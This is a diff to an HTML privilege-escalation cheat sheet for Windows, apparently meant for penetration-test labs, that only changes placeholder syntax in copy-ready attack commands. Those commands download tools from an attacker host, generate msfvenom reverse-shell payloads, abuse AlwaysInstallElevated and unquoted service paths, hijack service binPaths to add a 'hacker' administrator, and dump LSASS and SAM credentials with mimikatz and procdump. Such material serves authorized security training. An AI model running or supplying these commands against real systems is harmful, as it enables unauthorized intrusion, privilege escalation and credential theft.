@@ -145,7 +145,7 @@
     <section class="sec" id="auto">
       <div class="sec-head"><h2>Automated Tools</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">transfer + run winpeas</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/winPEASx64.exe','C:\Windows\Temp\wp.exe')
+        <pre>(New-Object Net.WebClient).DownloadFile('http://$KALI:8080/winPEASx64.exe','C:\Windows\Temp\wp.exe')
 C:\Windows\Temp\wp.exe
 <span class="c"># If AV kills it:</span>
 C:\Windows\Temp\wp.exe log   <span class="c"># saves to winPEAS.log in cwd</span>
@@ -160,14 +160,14 @@ C:\Windows\Temp\wp.exe log   <span class="c"># saves to winPEAS.log in cwd</span
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> RED — AlwaysInstallElevated = 1 in both hives</span>
-          <span class="sig-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f msi -o evil.msi <span class="sig-note">-- generate MSI on kali</span></span>
+          <span class="sig-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f msi -o evil.msi <span class="sig-note">-- generate MSI on kali</span></span>
           <span class="sig-cmd">msiexec /quiet /qn /i C:\Windows\Temp\evil.msi <span class="sig-note">-- run as SYSTEM</span></span>
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> YELLOW — unquoted service path with writable dir</span>
           <span class="sig-cmd">icacls "C:\Program Files\Vulnerable App" <span class="sig-note">-- confirm write access</span></span>
-          <span class="sig-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o Program.exe <span class="sig-note">-- generate payload with matching name</span></span>
-          <span class="sig-cmd">sc stop &lt;service&gt; && sc start &lt;service&gt; <span class="sig-note">-- trigger execution</span></span>
+          <span class="sig-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o Program.exe <span class="sig-note">-- generate payload with matching name</span></span>
+          <span class="sig-cmd">sc stop $SERVICE && sc start $SERVICE <span class="sig-note">-- trigger execution</span></span>
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> YELLOW — saved credentials found (cmdkey /list)</span>
@@ -241,10 +241,10 @@ icacls "C:\Program Files\Some App"
 <span class="c"># (W) or (F) for BUILTIN\Users = writable</span>
 
 <span class="c"># Generate payload + place it:</span>
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o "Some.exe"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o "Some.exe"
 <span class="c"># Copy to: C:\Program Files\Some.exe</span>
-sc stop &lt;servicename&gt;
-sc start &lt;servicename&gt;</pre></div>
+sc stop $SVCNAME
+sc start $SVCNAME</pre></div>
     </section>
 
     <section class="sec" id="weaksvcs">
@@ -252,14 +252,14 @@ sc start &lt;servicename&gt;</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">accesschk + exploit</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 accesschk.exe /accepteula -uwcqv "Everyone" *
-accesschk.exe /accepteula -ucqv &lt;servicename&gt;
+accesschk.exe /accepteula -ucqv $SVCNAME
 <span class="c"># Look for: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS</span>
 
 <span class="c"># If you can change config:</span>
-sc config &lt;servicename&gt; binPath= "cmd /c net user hacker P@ss123! /add"
-sc stop &lt;servicename&gt;; sc start &lt;servicename&gt;
-sc config &lt;servicename&gt; binPath= "cmd /c net localgroup administrators hacker /add"
-sc stop &lt;servicename&gt;; sc start &lt;servicename&gt;
+sc config $SVCNAME binPath= "cmd /c net user hacker P@ss123! /add"
+sc stop $SVCNAME; sc start $SVCNAME
+sc config $SVCNAME binPath= "cmd /c net localgroup administrators hacker /add"
+sc stop $SVCNAME; sc start $SVCNAME
 <span class="c"># Now: evil-winrm or RDP as hacker:P@ss123!</span></pre></div>
     </section>
 
@@ -270,7 +270,7 @@ sc stop &lt;servicename&gt;; sc start &lt;servicename&gt;
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 <span class="c"># BOTH must show: AlwaysInstallElevated    REG_DWORD    0x1</span>
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f msi -o evil.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f msi -o evil.msi
 <span class="c"># Transfer to victim, then:</span>
 msiexec /quiet /qn /i C:\Windows\Temp\evil.msi</pre></div>
     </section>
@@ -321,7 +321,7 @@ sekurlsa::logonpasswords    <span class="c"># cleartext creds + hashes from LSAS
 lsadump::sam                <span class="c"># local SAM hashes</span>
 lsadump::lsa /patch         <span class="c"># domain hashes if DC</span></pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">dump LSASS memory (AV evasion)</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/procdump.exe','C:\Windows\Temp\pd.exe')
+        <pre>(New-Object Net.WebClient).DownloadFile('http://$KALI:8080/procdump.exe','C:\Windows\Temp\pd.exe')
 C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
 <span class="c"># Download lsass.dmp to kali, then:</span>
 pypykatz lsa minidump lsass.dmp</pre></div>
